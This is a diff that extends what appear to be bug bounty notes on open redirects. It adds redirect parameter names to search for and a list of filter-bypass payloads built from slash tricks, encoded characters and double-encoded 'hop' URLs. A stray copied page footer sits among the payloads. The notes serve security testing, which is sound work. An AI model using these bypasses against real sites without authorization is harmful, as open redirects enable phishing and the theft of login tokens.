@@ -106,3 +106,46 @@ As a result, this ultimately leads to the leakage of Auth0 or other equivalent c
   
 Common mistakes: Reporting open redirects as simple issues without escalating their impact. Don't underestimate their potential. Always look for ways to level up! 💡
 ```
+
+look for (dork)
+```
+return, return_url, rUrl, cancelUrl, url, redirect, follow, goto, returnTo, returnUrl, r_url,
+history, goback, redirectTo, redirectUrl, redirUrl
+```
+
+
+```
+\/yoururl.com
+\/\/yoururl.com
+\\yoururl.com
+//yoururl.com
+ZSeanos Methodology - https://www.bugbountyhunter.com/ Page 23
+//theirsite@yoursite.com
+/\/yoursite.com
+https://yoursite.com%3F.theirsite.com/
+https://yoursite.com%2523.theirsite.com/
+https://yoursite?c=.theirsite.com/ (use # \ also)
+//%2F/yoursite.com
+////yoursite.com
+https://theirsite.computer/
+https://theirsite.com.mysite.com
+/%0D/yoursite.com (Also try %09, %00, %0a, %07)
+/%2F/yoururl.com
+/%5Cyoururl.com
+//google%E3%80%82com
+```
+
+encode something that will force the browser to decode it and then redirect
+```
+/redirect%3Fgoto=https://www.zseano.com/%253Fexample=hax
+```
+
+
+Hop 2 times and encode to bypass
+```
+https://example.com/login?return=https://example.com/?redirect=1%26returnurl=http
+```
+
+```
+https://example.com/login?return=https%3A%2F%2Fexample.com%2F%3Fredirect=1%2526returnurl%3Dhttps%253A%252F%252Fwww.google.com%252F
+```
